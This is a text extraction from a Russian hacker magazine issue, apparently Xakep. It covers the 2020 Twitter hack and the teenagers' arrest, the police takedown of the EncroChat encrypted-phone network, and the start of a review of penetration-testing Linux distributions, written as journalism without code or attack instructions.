содержимое аккаунта, вос пользовавшись функци ей Your Twitter Data. Инте‐
ресно, что ни один из этих семи аккаунтов не был верифицирован (не имел
синей галочки).
   Также  злоумышленники прос матривали  личные сообщения  владель‐
цев 36 скомпрометированных учетных записей. При чем один из этих акка‐
унтов принадлежал неназ ванному нидерландскому политику.
  В Twitter подчеркивали, что зло умышленники не могли увидеть пре дыду‐
щие версии паролей от учетных записей, так как те не хранятся открытым тек‐
стом и недоступны через внут ренние инс трументы компании. Зато сооб‐
щалось, что хакеры имели воз можность прос матривать личную информацию
пользователей, включая адреса электронной почты и номера телефонов,
видимые для некоторых учетных записей.


КАК ВЗЛОМАЛИ?
Очень быстро выяснилось, что хакеры не вос поль зовались какой‐либо уяз‐
вимостью и не обошли двухфакторную аутентификацию аккаунтов, а попросту
добрались до админ‐панели Twitter, через которую и управляли чужими акка‐
унтами. Причем сооб щения со скриншотами, доказы вающими эту теорию,
начали появ ляться непосредственно в день взлома, но сотрудни ки Twitter их
сразу же удаляли, а тех, кто их пуб ликовал, нещадно банили (отредактирован‐
ные версии скриншотов можно увидеть ниже).





На этих скриншотах хорошо видно, что сотрудники Twitter имеют воз можность
контролировать учетные записи пользователей, вклю чая изменение адресов
электронной почты, привязанных к аккаунтам, и полную блокировку учетных
записей. Кроме того, кнопки Search Blacklist и Trends Blacklist прямо указыва‐
ют на то, что сотрудники компании могут определять, какие сообщения
попадают в поиск и тренды платформы, а какие нет.
  На поднявшуюся волну критики и обвинения в цензуре сотрудники Twitter
отвечали, что компания никогда и не скрывала: не все, что пишут пользовате‐
ли, может попадать в тренды.
  Лишь 30 июля 2020 года, спустя две недели после инцидента, предста‐
вители Twitter официально подтвердили, что атака на социальную сеть стала
результатом компрометации сразу нес кольких сотрудников компании. Выяс‐
нилось, что 15 июля 2020 года мошенники устро или фишинговую атаку
по телефону и примени ли против сотрудни ков социальную инженерию.
   Когда учетные данные, похищенные у одного из сотрудников, не дали
хакерам доступа к внутренним инс трументам Twitter, злоумышленники ата‐
ковали других работников компании, у которых были нужные права и доступ.



      «Не все ата кованные сотрудники име ли пра ва для использования инс-
      тру ментов  управле ния  учетными  записями,  но  злоумыш ленники
      использовали их учетные данные для дос тупа к нашим внутренним
      сис темам и получе ния информа ции о наших процес сах. Эта информа-
      ция поз волила им ата ковать дру гих сотрудников, которые обла дали
      дос тупом к нашим инс тру ментам под дер жки», — пишут пред ста вите ли
        Twitter.

Журналисты издания Vice Motherboard предположили, что «скоординирован‐
ная атака на сотрудников компании с при менением соци альной инженерии»
была обычной инсайдерской работой. То есть, по информации журналистов
и их анонимных источников, хакеры попросту подкупили сотрудника Twitter,
чтобы получить доступ к той самой адми нистративной панели.
   Стоит отметить, что похожие инциденты в Twitter слу чались и раньше. Так,
в 2017 году один из сот рудников социальной сети на некоторое вре мя удалил
учетную запись президента США Дональда Трампа, а в 2019 году Министерс‐
тво юстиции США сообщало, что два сотрудни ка Twitter злоупотребляли сво‐
им доступом для шпиона жа в пользу Саудовской Аравии.


ПОСЛЕДСТВИЯ
Вскоре после взлома гла ва Twitter Джек Дорси писал, что это был крайне
тяжелый день для компании. Также он пообещал, что рас следование произо‐
шедшего будет максимально прозрачным.





Стремясь разобраться в про исходящем и снизить риски, инженеры Twitter
пошли на крайнюю меру, которую сами называ ли «разрушительной»: превен‐
тивно заблокировали огромный кластер учетных записей (даже не подвергав‐
шихся атаке, на первый взгляд), огра ничив для них публикации, возможность
сменить пароль и многие другие функции. Вла дель цам пообещали вернуть
доступ к этим аккаунтам сра зу же, как только ста нет ясно, что они в безопас‐
ности и угроза устранена. В ито ге для многих поль зователей Twitter нес колько
дней работал с перебо ями.
   Также после атаки на время расследования Twitter серьезно ограничила
доступ своих сотрудников к внутренним инс трументам и системам. Эти огра‐
ничения в первую очередь коснулись уже упо мяну той функции Your Twitter
Data, которая позволя ет пользователям загружать все свои данные из Twitter,
но также ограничения распростра нились и на дру гие сервисы.



     «Мы будем мед леннее реагировать на зап росы, связанные с под дер-
      жкой акка унтов, жалоба ми на сообщения в Twitter и приложе ниями
      на нашей платформе для раз работчиков. Мы сожале ем о любых воз-
      ника ющих задер жках, но считаем, что это необходимая мера пре дос-
      торожности, пос кольку пос ле инцидента мы вносим долговре менные
      изме нения в наши процес сы и инс тру менты. Мы пос тепенно вер немся
       к нор мальному вре мени отклика, но лишь когда будем уве рены, что
      это безопас но», — обе щали раз работчики в конце июля.

Генпрокурор Нью‐Йорка Летиция Джей мс заявила, что атака на  Twitter
вызывает серьезные опасения по поводу безопасности данных и того,
как подобные платформы могут быть использованы для нанесе ния вреда
общественным дебатам.
  Сенатор Рон Уайден, в свою очередь, задал ся резонным вопросом,
почему социальная сеть не реализовала сквозное шифрование для личных
сообщений, хотя еще в 2018 году работала над этой функциональностью. Его
поддержала активистка Ева Гальперин из Electronic Frontier Foundation:



        «Twitter сейчас не приш лось бы бес покоиться о том, что злоумыш-
      ленники могли прочитать, похитить или изме нить лич ные сообщения,
      если бы ком пания внед рила E2E для лич ных сообщений, как EFF про-
      сил годами».

Еще один американский сенатор — Джош Хоули призвал Twitter сотрудничать
с властями, вклю чая Министерство юстиции и ФБР, для обеспечения
безопасности.



      «Я обес покоен  тем,  что  это событие могло представ лять собой
      не прос то набор отдельных инцидентов, а скорее успешную и ско-
      ординированную ата ку на безопас ность самой ком пании Twitter», —
      говорит Хоули, поп росив ший гла ву Twitter Дже ка Дор си пре дос тавить
      влас тям дополнительную информа цию об инциденте.


АРЕСТ ПОДОЗРЕВАЕМЫХ
Сразу после атаки некоторые ИБ‐специалисты писали, что инцидент, веро‐
ятно, был не так прост, как кажется на первый взгляд. Ведь получить дос туп
такого уров ня и «потратить» его на фейковую раздачу криптовалюты, при нес‐
шую немногим больше ста тысяч долларов, — это довольно странный шаг
для хакеров: в теории такой дос туп можно было про дать за миллионы. Поэто‐
му многие полагали, что настоящей целью этой кампании, вероятно, могло
быть, к примеру, хищение данных.
  Тем временем другие эксперты писали, что некоторые преступники поп‐
росту не слишком умны и за этой неуклюжей атакой вполне могут стоять под‐
ростки. В итоге имен но это предположение и ока залось верным.





Вечером 31 июля 2020  года американские пра воохранители собрали
пресс‐конференцию, на которой объяви ли о задержании главного «идейного
вдохновителя» взло ма компании Twitter. Им оказался 17‐летний подросток
из штата Флорида Грэм Айвен Кларк (Graham Ivan Clark), судя по всему извес‐
тный в сети под псевдонимом Kirk.





                        Грэм Айвен Кларк

Совместное расследование, проведенное ФБР, Налоговым управлением
США, Министерством юстиции и Секретной службой, помогло выявить сооб‐
щников предполагаемого хакера. Таковыми были наз ваны еще двое молодых
людей: 19‐летний Мейсон «Chaewon» Шеп пард из Великобритании и 22‐лет‐
ний Нима «Rolex» Фазели из Флориды.
  Известно,  что  Грэму  Айвену  Кларку были  предъ явлены  обвинения
по 30 пунктам, вклю чая:
 • финансовые махинации (в размере свыше 50 тысяч долларов);
 • мошенничество со средства ми свя зи (в раз мере более 300 долларов);
 • мошенничество с использованием пер сональ ных данных  (в раз мере
   более 100 тысяч дол ларов или более 30 пострадавших);
 • злоупотребле ние персональными данными;
 • неправомочный доступ к компьютеру или электронному устройству (путем
   сговора для совершения мошеннических дей ствий).

Интересно, что Кларка будут судить как взрослого, так как дело име ет мес то
в Тампе, а законы во Фло риде раз реша ют обвинять и судить несовершенно‐
летних как взрослых, если речь идет о финансовом мошенничестве.



      «Он 17-летний под росток, который только что окончил среднюю шко-
       лу, но не заблуждайтесь, он сов сем не обыч ный сем надца тилетка.
      Это была крайне сложная ата ка, невиданных ранее мас шта бов.
      Тот факт, что он сумел получить лишь 100 тысяч долларов за день,
      объясняется тем, что его довольно быс тро поймали. Но пом ните, что
      речь идет не только о деньгах, [этот взлом] мог дес табилизировать
     финансовые рынки, как в Аме рике, так и по все му миру, потому что
       [хакер] получил дос туп к акка унтам наиболее влиятельных политиков.
     Он мог пов редить аме риканской политике и международ ной дип-
      ломатии.
      Это не игра, это серьезные прес тупле ния с серьезны ми пос ледс тви-
      ями. Если вы считаете, что можете обма нуть людей в сети и это сой-
      дет вам с рук, вас ждет горькое разоча рова ние. Горькое разоча рова-
      ние, которое нас тигнет вас в шесть утра, когда в вашу дверь пос тучат-
      ся федеральные агенты», — заявил прокурор Хиллсборо Эндрю Уор-
      рен (Andrew Warren).


КАК ИХ ПОЙМАЛИ?
Подростков поймали быстро, спус тя чуть больше двух недель после атаки.
Из опубликованных судебных документов становится ясно, что виной тому их
собственная небрежность и бес печность. Попробуем понять, как выглядела
примерная хронология событий.
   Согласно официальным бумагам, все началось еще 3 мая 2020 года, ког‐
да Грэм Айвен Кларк начал ата ковать сотрудни ков Twitter и получил доступ
к сети компании. Судя по всему, в период с 3 мая по 15 июля (когда произо‐
шел массовый взлом учетных записей Twitter) Кларк пытался раз вить свою
атаку и перейти от исходной точки про никновения к инструменту администри‐
рования.





                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
      ХРОНИКА АТАКИ
         НА TWITTER
               КАК ПОЙМАЛИ ХАКЕРОВ, ВЗЛОМАВШИХ
                          СОЦИАЛЬНУЮ СЕТЬ




К примеру, издание The New York Times, со ссылкой на собственные источни‐
ки в хакерском сооб ществе, писало, что изна чаль но Кларк получил дос туп
к внутреннему Slack компании Twitter, где в одном из каналов якобы нашел
учетные данные для внутреннего административного инструмента. Но одних
только учетных данных, похоже, было бы недостаточно для доступа к бэкенду
Twitter. Сообщение в официальном блоге Twitter гла сит, что учетные записи
сотрудников были защищены двухфакторной аутентификацией. Судя по все‐
му, именно на обход этих защитных мер Кларк и потратил время, а в итоге
применил социальную инженерию и совершил фишинговую атаку на работ‐
ников компании по телефо ну, что позволило обойти «второй фактор» защиты.
  Добравшись до внутреннего администра тивного инструмента компании,
Кларк направился в Discord, где он зарегистри рован под псевдонимом Kirk
#5270, и связался с дву мя другими пользователями, чтобы с их помощью
монетизировать полученный дос туп. В судеб ных документах приводятся логи
чатов, где пользователь Kirk #5270 общается с дву мя пользователями Dis‐
cord‐канала OGUsers — Rolex #0373 (Нима Фазели) и ever so anxious #0001
(Мейсон Шеппард).


OGUsers начинал свою работу как сайт, где продавали угнанные учетные
записи на самых разных платформах и сервисах. Но если все начиналось
с «интересных» аккаунтов в социальных медиа (Twitter, Instagram) с уникаль‐
ными или короткими юзернеймами, то позже раз вилось в пол ноценный
хакерский ресурс для продажи любых акка унтов, в числе которых учетные
записи пользователей PlayStation Network, Steam, Domino’s Pizza.
  Кроме того, журналис ты издания Vice Motherboard обращали свое вни‐
мание на OGUsers еще в 2018 году, когда готови ли цикл статей об учас‐
тившихся случаях мошен ничес тва с SIM‐картами. Такие атаки с захватом
чужих телефонных номеров используются для хищения аккаунтов в соци аль‐
ных  сетях, краж  крупных сумм в криптовалю те и подобных действий.
OGUsers — одна из крупнейших торговых площадок, где продавались укра‐
денные при таких обсто ятельствах аккаунты.
  Нужно отметить, что за последние годы форум был взломан дважды. Пер‐
вый взлом произошел в мае 2019 года. Тогда ата кующие проникли на сервер
через уязвимость в одном из кас томных плагинов и получили доступ к бэкапу,
датированному 26 декаб ря 2018 года. Второй раз форум взломали в апре‐
ле  2020  года.  В  этом  случае  злоумышленни ки  похитили  данные
всех 200 тысяч зарегистрированных пользователей.


В чате Kirk #5270 заявил, что он работает в компании Twitter, и в качестве
доказательства изменил нас тройки учет ной записи, принадлежащей Rolex
#0373, а также продал ему доступ к учетной записи @foreign. В свою оче редь,
пользователю ever so anxious #0001 он про дал доступ к нес кольким аккаунтам
с короткими и цен ными именами: @xx, @dark, @vampire, @obinna и @drug.





             Кларк доказывает Фазели, что у него есть дос туп





                Продажа дос тупа к чужим акка унтам





  Переговоры о продаже ценных имен пользователей. Фото: Krebs
  on Security

После того как Кларк убедил Фазели и Шеппарда в том, что у него есть дос‐
туп нужного уровня, они заключили сделку и решили раз местить на форуме
OGUsers рекламу взло ма и продажи учетных записей Twitter.





                      Ха керы обговари вают цену

Изменить email‐адрес, привязанный  к любой учетной записи  Twitter, —
250 долларов. Прямой доступ к учетным записям — 2000–3000 дол ларов
за штуку.





  Объявление, в итоге размещенное на OGUsers. Фото: Krebs on Security

Судя по всему, услугами из это го объявления успели воспользоваться нес‐
колько человек. Так, предста вители про куратуры заявляли на пресс‐кон‐
ференции, что ищут еще нескольких пользователей, участвовавших во взло‐
ме.
  Уже на следующий день после ата ки на Twitter ФБР и Секретная служба
начали расследование. Согласно судеб ным документам, вначале правоох‐
ранители опирались на данные из социальных сетей и репортажи новос тных
агентств, что помогло им выйти на след потенциальных злоумышленников
и запросить у компании Discord логи и сведения о конкретных пользователях.
   Так как хакеры разместили объявление на OGUsers, ФБР воспользовалось
БД, утекшей с хакерского форума и попавшей в сеть после инцидента в апре‐
ле текущего года. Напомню, что тот дамп содержал email‐ и IP‐адреса поль‐
зователей OGUsers, а также их личные сооб щения.
  Кроме того, прибегнув к помощи Налогового управления США, правоох‐
ранители  обратились  к  представителям  биржи  Coinbase  и  получили
информацию о биткойн‐адресах, которые злоумышленни ки использовали
во время атаки на Twitter, а также об адресах, которые хакеры упоминали
в чатах Discord и сооб щениях на форуме OGUsers.
  Сопоставив данные из этих трех источников, специалисты ФБР смогли
отследить активность хакеров на трех сайтах, а также связать их с конкрет‐
ными email’ами и IP‐адресами. Нужно сказать, что это было совсем нетрудно:
к примеру, Фазели вычислили благодаря тому, что он открыто указал в про‐
филе на OGUsers свой никнейм в Discord.





                  Профиль Фазели на OGUsers

Помимо этого, Фазели совершил множество дру гих ошибок и, кажется, даже
не  пытался  скрыть  свою  личность.   Так,  он  использовал  адрес
damniamevil20@gmail.com  для  регистра ции  учетной  записи  на форуме
OGUsers и адрес chancelittle10@gmail.com для захвата учетной записи @for‐
eign в Twitter. И эти же два адреса он использовал для регистрации учетных
записей на бирже Coinbase, которые затем верифицировал с помощью
фотографии собственных водительских прав.
  Более того, для доступа к учетным записям на всех трех упомянутых сайтах
Фазели использовал обычный домашний интернет, не пытаясь хоть как‐то
защитить соединение. В ито ге он зас ветил свой домашний IP‐адрес в логах
всех трех сервисов (Discord, Coinbase и OGUsers).
  Похоже поступал и Шеппард, который был зарегистрирован на OGUsers
под ником Chaewon. Следователи заяви ли, что смогли связать Discord‐поль‐
зователя ever so anxious #0001 с про филем на OGUsers благодаря объ явле‐
нию, которое тот разместил на сайте в день взлома Twitter.
   Изучив утекшую базу данных пользователей OGUsers, правоохраните ли
обнаружили еще одно подтверждение: Chaewon покупал аккаунт в виде оигре
через тот же биткойн‐адрес, который позже использовали хакеры в день
взлома  Twitter. Дело в том, что Шеппард тоже имел несколько учетных
записей на Coinbase, которые он под твердил с помощью своих реальных
водительских прав.





                  Транзакции с кошелька Шеп парда

Увы, пока власти не объяснили, как именно они связали Кларка с Discord‐
пользователем Kirk#5270, но можно предположить, что 17‐летний Кларк едва
ли был осторожнее своих горе‐сообщников.
   22 июля 2020 года независимый ИБ‐журналист Брайан Кребс взял
интервью у человека, скрывающегося под псевдонимами Chaewon и ever so
anxious (тогда еще не было известно, что это Мейсон Шеппард). Тот уверял,
что он лишь выступал посредником меж ду поль зовате лем Kirk и другими
людьми, которые хотели приобрести дос туп к ценным учетным записям в Twit‐
ter, и не участвовал в пос леду ющей афере с биткойнами и тем более во взло‐
ме социальной сети.


      «Я связался с Kirk, и это была худ шая ошибка, которую я когда‑либо
      совер шал. Из‑за этого я ока зался втянут в проблемы, к которым
      не имею никакого отношения. Если бы я знал, что Kirk собира ется
      сде лать то, что он в итоге сде лал, если бы я в самом начале понял,
      что он  хакер, который выда ет себя  за  сотрудника ком пании,  я
      не захотел бы ста новиться пос редником», — сетовал Chaewon.
HEADER





                                                                  Мария «Mifrill» Нефёдова
                                                                                              nefedova@glc.ru




      ЛИКВИДАЦИЯ
ENCROCHAT

   КАК ПРАВООХРАНИТЕЛИ ЗАКРЫЛИ ПЛАТФОРМУ
       ДЛЯ ЗАШИФРОВАННЫХ КОММУНИКАЦИЙ
          И АРЕСТОВАЛИ БОЛЕЕ 750 ЧЕЛОВЕК





В начале июля 2020 года Евро пол, британское Националь‐
ное агентство по борьбе с преступностью (NCA), а так же
правоохранительные органы Франции, Швеции, Норвегии
и Нидерландов официально сообщили о лик видации плат‐
формы  для  зашифрован ных  коммуникаций  EncroChat,
которой пользовались больше 60 тысяч человек по всему
миру.


КАК ЭТО РАБОТАЛО
Как можно увидеть на архивной копии сайта компании, телефоны EncroChat
гарантировали своим пользователям абсолютную анонимность: устройство
и SIM‐карта не привязывались к учетной записи клиента, и приобре тали их
так, что отследить происхождение было невозможно. Также гарантировалась
полная  конфиденциальность: зашиф рованный  интерфейс был надежно
скрыт, а само устрой ство модифицировано — физически отсутствовали
камера, микрофон, GPS‐модуль и USB‐порт.





         Телефон EncroChat. Фото: TWITTER/@MISDAADNIEUW2

Девайсы поставлялись сра зу с двумя ОС: если пользователь хотел, чтобы
устройство выглядело безобидным, он загружал обычный Android. А когда
возникала нужда в секретных чатах, пользователь переключал ся на систему
EncroChat.
  По данным издания Vice Motherboard, телефоны EncroChat были пос тро‐
ены на базе модифицированных BQ Aquaris X2 — Android‐смартфонов,
выпущенных в 2018 году испанской компанией — производителем электро‐
ники.
  Операторы платформы EncroChat уста навливали на телефоны собствен‐
ные зашифрован ные программы для обмена сооб щениями и VoIP‐звонков,
чтобы маршрутизировать тра фик через серверы компании. Также телефоны
имели функцию быстро го и полного обнуления устройства, если поль‐
зователь вводил специальный PIN‐код.
  Компания продавала такие телефо ны по подписке: сам аппарат оценивал‐
ся примерно  в 1000 фунтов,  а шес тимесячный  контракт  стоил  око‐
ло 1500 фунтов стерлингов. Хотя на сайте говорится, что у EncroChat есть
ресейлеры в Амстердаме, Рот терда ме, Мадриде и Дубае, на самом деле
компания работала очень скрытно.
  Издание Vice Motherboard, пос вятившее огромную статью этой опе рации
правоохранительных орга нов, пишет, что некто, контролиру ющий адрес элек‐
тронной почты компании EncroChat, заявил журналис там, будто EncroChat —
работающая в рамках закона компания с клиента ми в 140 странах мира.



     «Мы — ком мерчес кая ком пания, пред лагающая  услу ги  в области
     защищенной связи через мобильные устройства. Мы решили соз дать
      луч шую технологию на рынке, чтобы обес печить надежный и безопас-
     ный сер вис для организа ций или физичес ких лиц, которые хотят
      защитить свою информа цию», — писал пред ста витель ком пании.

При этом, по данным правоохранителей, 90% клиентов EncroChat — прес‐
тупники. У EncroChat было порядка 60 тысяч поль зователей по всему миру,
и примерно 10 тысяч из них жили в Великоб ритании.
  Журналисты рассказывают, что купить устрой ство EncroChat было совсем
непросто. Собствен ный источник изда ния (в прошлом пользователь En‐
croChat, ныне отбывающий тюремный срок) сообщил, что приобрел свой
телефон в обычном магазине, у его хозяина. Одна ко все происходило в пере‐
улке позади здания и «выглядело как наркосделка».


ВНЕДРЕНИЕ В ENCROCHAT
Правоохранители говорят, что совмес тная операция, получившая название
Venetic, стала одной из крупнейших в истории и уже при вела к арес‐
ту 746 человек, изъятию 54 миллионов фунтов стерлингов наличными (при‐
мерно 67,4 миллиона долларов), 77 единиц огнестрельного оружия (авто‐
маты, пистолеты), четыре гра наты и более 1800 патронов, 55 дорогос тоящих
автомобилей и более двух тонн наркотиков.
  К примеру, французские правоохранители отказались раскрывать под‐
робности своих расследова ний и их результаты, но гол ландские власти
заявили, что лик видировали 19 лабора торий по производс тву синтетических
наркотиков, арестовали более 100 подоз реваемых, изъяли более 8000 килог‐
раммов кокаина, 1200 килограммов метамфетамина, десятки пистолетов,
люксовых автомобилей (включая машины со скрытыми отсе ками) и часов,
а также почти 20 миллионов евро (22,5 миллиона дол ларов) наличными.





                Брикеты с кокаином. Фото: SWROCU





                  Изъятая наличность. Фото: NCA

Расследование началось еще в 2017 году во Франции под кодовым наз вани‐
ем Emma 95. Затем оно рас пространилось в Нидерланды, где носило имя La‐
mont, и в итоге правоохранители объединили усилия, к делу подключились
Великобритания, Швеция и Норвегия.
  Следователи расска зывают,  что наш ли способ  взломать  EncroChat,
не взламывая само шифрование  плат формы. Вмес то  этого несколько
месяцев назад французские пра воохранители проникли в сеть EncroChat
и внедрили на устрой ства компании малварь, которая позволила читать сооб‐
щения преступников, прежде чем те были отправлены. В итоге европейские
полицейские изучили «более ста миллионов зашифрованных сообщений»
и стали свидетелями того, как наркоторговцы договаривались об оптовых
сделках, преступники обсуждали убийства и отмывание денег.



      «Эти сообщения дали пред став ление о бес пре цедентно огромном
      количес тве серьезных прес тупле ний, вклю чая данные о круп ных меж-
      дународ ных пос тавках нар котиков и [мес тонахождении] нар колабо-
      раторий, убийствах, гра бежах, вымогательстве, тяжких нападе ниях
      и захватах заложников. Совер шенно проз рачны ми ста ли международ-
     ные коридоры для пос тавок нар котиков и отмы вания денег», — пишут
      голланд ские пра воохранительные органы.
          «То, что обыч но воз можно только в полицейских триллерах, про-
      исходило на наших гла зах, — добав ляет гла ва Национального депар-
      тамента уголов ных рас сле дова ний Нидер ландов Энди Кра аг. — Мы
      читали сообщения, которые давали нам пред став ление о пов седнев-
      ной жиз ни криминального мира».


ПАНИКА В КРИМИНАЛЬНОМ МИРЕ
Еще в мае текущего года некото рые пользователи EncroChat заметили проб‐
лему: функция обнуления на их телефо нах не работала. Как рас сказал Vice
Motherboard анонимный сотрудник EncroChat, тог да в компании сочли, что
пользователь, вероятно, просто забыл свой PIN‐код или функция обнуления
была некорректно настроена.
  Но уже в сле дующем месяце EncroChat уда лось отследить одно из таких
«глючных» устрой ств модели X2. Выяс нилось, что проблема не в пользовате‐
ле и не в настрой ках: на телефо не нашли мал варь, а устройство оказалось
взломано. Причем  вредоносная  прог рамма была  спе циально  создана
для модели X2. Она не только мешала корректной работе функции очис тки
девайса, но и была разработа на таким образом, чтобы скры вать себя
от обнаружения, записывать пароль блокировки экрана и клонировать дан‐
ные приложе ний.
  Понимая, что это атака, в течение следующих дней EncroChat выпустила
обновление для своих устройств, чтобы вос становить их функциональность
и собрать информацию о малвари, которая проникла на телефоны компании
по всему миру. Разработчики EncroChat ста ли уведомлять пользовате лей
и следили за происходящим уда лен но, не имея возможности получить
физический доступ к устройствам.
  Однако почти сразу после релиза этого патча атакующие снова нанесли
удар: малварь вернулась, и теперь она мог ла еще и изменить пароль для бло‐
кировки экрана, а не прос то записать его.
  Операторы EncroChat начали паниковать. Они разослали своим поль‐
зователям сообщение, информируя их о продолжающейся атаке. Также ком‐
пания уведомила о ситуации своего провайдера SIM‐карт, гол ландскую
телекоммуникационную компанию KPN, и та заб локировала для малвари
соединения с серверами атакующих. Но, судя по всему, к тому моменту KPN
уже сотрудничала с влас тями (предста вители KPN пока отказываются от ком‐
ментариев), поэто му вскоре компания уда лила брандмауэр, что вновь поз‐
волило  серверам  ата кующих  обмениваться  данными  с  телефонами
EncroChat.
   Тогда в EncroChat решили полностью сво рачивать все операции. «Мы при‐
няли решение немедленно отключить все SIM‐карты и сеть», — рассказывает
сотрудник компании. К тому моменту в компании уже понимали, что им про‐
тивостоит не очередная конкуриру ющая фир ма, а пра вительство.



      «Сегод ня наш домен незаконно захватили государс твенные струк туры.
     Они использовали наш домен для запус ка ата ки. <…> Из‑за уров ня
      сложности ата ки и вре донос ного кода мы больше не можем гаран-
      тировать безопас ность вашего устройства. Совету ем вам немед ленно
      отклю чить и физичес ки унич тожить устройство», — такое сообщение
      опе раторы   EncroChat   отпра вили   всем   своим   пользовате-
      лям 13 июня 2020 года.





         Сообщение от операторов EncroChat. Фото: Европол

После этого сообщения от EncroChat мно гие пользовате ли запаниковали.
Судя по скриншотам, ока завшимся в рас поряжении Vice Motherboard, некото‐
рые пользователи даже пытались определить, была ли затронута атакой их
конкретная модель телефона.
  Но было уже слишком поз дно. К это му времени европейские правоох‐
ранительные органы уже давно извлекли множество данных с устройств En‐
croChat по всему миру, и перед ними предста ли многомиллионные наркоим‐
перии и преступные синдикаты в виде тексто вых сообщений и фотографий.
У полиции было буквально все: фотографии огромных стопок наркотиков,
лежащих на весах; килограммовые брикеты кока ина; сумки, доверху забитые
экстази. Сообщения о запланированных сделках и поставках. Фотографии
членов семей предполагаемых прес тупни ков и обсужде ния их личных дел.
  После этого правоохранители начали дей ство вать: последовали кон‐
фискации  грузов, рейды на торговцев наркотика ми, массовые арес ты.
И общим знаменателем происходящего была компания EncroChat.
  Журналисты отмечают, что, по сло вам источника, близкого к пользовате‐
лям EncroChat, криминальный мир в смятении, так как лишился одного
из основных способов свя зи. Многие клиенты EncroChat сейчас пытаются
пересечь границы и избежать задержания. Также источник отме тил, что
покупать наркотики оптом ста ло намного сложнее.


НЕ ПЕРВЫЙ СЛУЧАЙ
Ликвидация EncroChat и арес ты пользователей — далеко не беспре цеден‐
тный случай. К примеру, в 2018 году был арес тован исполнительный директор
компании Phantom Secure, которая производила «невзламываемые» телефо‐
ны для преступников.
   Phantom Secure размещала свои серверы в Панаме и Гонконге и исполь‐
зовала виртуальные прокси, чтобы скрывать их физичес кое мес тоположение.
Также платформа помогала уда ленно уничтожать данные на устройствах, уже
изъятых правоохранительными орга нами.
  Подписка на сервис Phantom Secure стоила 2000–3000 долларов за пол‐
года. Для защиты анонимности клиентов и деятель ности самой Phantom Se‐
cure сделки производились в цифровых валютах, в том чис ле в биткойнах.
За эти деньги человек получал устройство, где и софт, и железо были
модифицированы таким обра зом, что бы обес печить анонимность и шиф‐
рование всех коммуника ций. GPS‐навигация, микрофон, камера, доступ
в интернет, мессенджер и даже технология передачи голоса — все было сде‐
лано с учетом осо бых нужд клиентов.
   Телефоны Phantom поль зовались большой популярностью в преступном
мире, в том числе у самой верхушки трансна циональных преступных груп‐
пировок. В частности, члены извес тно го наркокартеля Синалоа в Мексике
были клиентами компании Phantom Secure.
  Другую подобную компанию, MPC, создала организованная преступная
группа из Шотландии, связанная с наркоторговлей.
  Журналисты Vice Motherboard отмечают, что конкуренция в этой области
велика. Так, компании регулярно рас простра няют слу хи о небезопас ности
устройств друг друга и загружают на YouTube видео, дис кредитирующие кон‐
курентов. Или, к примеру, EncroChat рань ше вообще блокировала домены
других фирм.
  Другие компании, предлагающие услуги защищенной свя зи, сразу же
попытались запол нить пробел, образовавшийся пос ле исчезновения En‐
croChat. К примеру, компания Omerta уже нацелила свою рекламу на бывших
клиентов EncroChat.



      «EncroChat взломан, пользовате лей спа лили и арес товыва ют. КОРОЛЬ
      УМЕР! Вы чудом избе жали недав него „мас сового вымира ния“? Праз-
      днуйте со скид кой 10%. Присоединяйтесь к семье Omerta и общай-
      тесь без наказанно», — гла сит рек лама Omerta.

Представители Omerta сооб щили журналис там, что в последнее время у них
действительно наблюдается прирост трафика.
 COVERSTORY





       Hackcat
 Еще больше котов — на
 https://t.me/meawdream
 hackcat.dev@gmail.com





  Михаил Артюхин
kass.gameson@gmail.com
БОЕВОЙ
LINUX

 ОБЗОР САМЫХ МОЩНЫХ
 ДИСТРИБУТИВОВ
 ДЛЯ ПЕНТЕСТОВ И OSINT




 Собирать свою коллекцию хакерских тулз — это отлично,
 но теперь принято брать за основу один из специализиро‐
 ванных дис трибутивов. Обычно это Kali, но мы рассмотрим
 не только его, но и другие дистры для пентеста, подчас
 не менее эффективные, а в каких‐то областях и более полез‐
 ные.


 Дистрибутивов для пентеста множество. Одни популярны, другие — не очень,
 но все они преследуют цель дать хакеру удобный и надежный инстру мент
 на все случаи жизни. Большинством из программ в составе таких кастомизи‐
 рованных сборок средний хакер никогда не вос пользуется, но для понтов
 статусности их добавляют («Смотри, у тебя 150 утилит, а у меня — 12 000!»).
 Сегодня мы постараемся сделать обзор боль шинства интересных дистри‐
 бутивов, как популярных, так и незаслуженно забытых. Если же мы что‐то
 упустили — не стесняйся использовать коммента рии. Поехали!


            WARNING

                       Хотя эти дистрибутивы и предназначены для атак,
                          ответствен ность  за  их  использование несешь
                          только ты! Не забывай, что применение этих зна‐
                       ний во вред карается по закону.


      NST

  • Первый релиз: 2003 год
  • Основан на: Fedora
  • Платформы: x64
  • Графическая обо лоч ка: MATE


 Скачать

    Начнем с малоизвес тного, но оттого не менее инте ресного дистрибутива.
 NST (Network Security Toolkit) основан на Fedora и предназначен для сетевых
  атак. В основе интерфейса — MATE, который вызывает ощущение начала
 нулевых. В комплекте идет нес колько десятков самых важных инс трументов,
 в основном сетевые сканеры, клиенты для всевоз можных служб и разного
 рода перехватчики трафика. Но не хва тает таких полез ностей, как, например,
 masscan, и даже банального aircrack, хотя airsnort име ется.





             Основная часть софта лежит в папке Internet

 Больше всего вкусностей мож но найти в пап ке Applications → Internet. Тут
  у нас и Angry IP Scanner, написанный, кстати, на Java, и Ettercap, и даже
 OWASP ZAP, о котором мы уже писали в «Хакере». Есть неплохой сборник
 модулей для всевозможного спуфинга и ска на у пакета netwag. В деле он
 показал себя неплохо, жаль только, не очень удобен и жутко устарел.
    Весь проверенный мной софт работа ет прекрасно. В общем, всем ску‐
 чающим по древнему интерфейсу и привычным инс трументам рекомендует‐
  ся.


      KALI

  • Первый релиз: 2013 год
  • Основан на: Debian
  • Платформы: x86, x64, ARM, VirtualBox
  • Графическая обо лоч ка: Xfce


 Скачать

    Как ты, конечно, знаешь, Kali — один из самых распиаренных дистрибути‐
 вов для хакеров, и было бы странно, если бы мы про него не написали. О нем
 знают даже школьники, а с относитель но недавних пор он доступен в виде
 приложения прямо из Microsoft Store! Конечно, доступность — несомненный
 плюс, но система слегка перег ружена набором инстру ментов (хотя и не так
 сильно, как BlackArch), к тому же часть из них из коробки работает криво
 или не работает вооб ще.
    Защиты от дурака в Kali тоже не предус мотрено. Как показы вает практика,
 не всем пользователям понятно, что не стоит делать эту систему основной.
 От ядра до оболочки она была соз дана и оптимизи рована для выполнения
 боевых задач на фронтах ИБ и плохо пригодна для спокойной ежедневной
 работы. Многие нужные в быту механизмы там попросту отсутствуют, а попыт‐
